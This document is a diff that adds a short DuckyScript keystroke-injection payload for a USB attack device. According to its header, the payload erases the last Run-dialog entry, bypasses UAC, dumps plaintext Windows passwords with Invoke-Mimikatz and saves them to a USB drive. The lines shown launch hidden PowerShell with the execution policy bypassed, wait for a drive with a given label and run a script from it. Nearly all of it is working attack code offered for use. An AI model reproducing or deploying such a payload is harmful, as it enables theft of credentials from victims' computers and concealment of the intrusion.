@@ -1,0 +1,8 @@
+REM Author: H3ll0World
+REM Description: Invoke a payload which clean the last Run-MRU command, bypass the uac, dump the plaintext passwords using Invoke-Mimikatz PS Module, and finally save them into the a USB or whatever local storage you want.
+REM Requirements: Replace the label of your USB, SDCard, etc.
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -W H $l='PUT_HERE_YOUR_USB_LABEL'; while (!((Get-WmiObject Win32_LogicalDisk).VolumeName -eq "$l")) {}; powershell -Ex Bypass ((Get-WmiObject Win32_LogicalDisk | Where-Object {$_.VolumeName -eq "$l"} | Select-Object DeviceID).DeviceID + '\Payload.ps1')
+ENTER
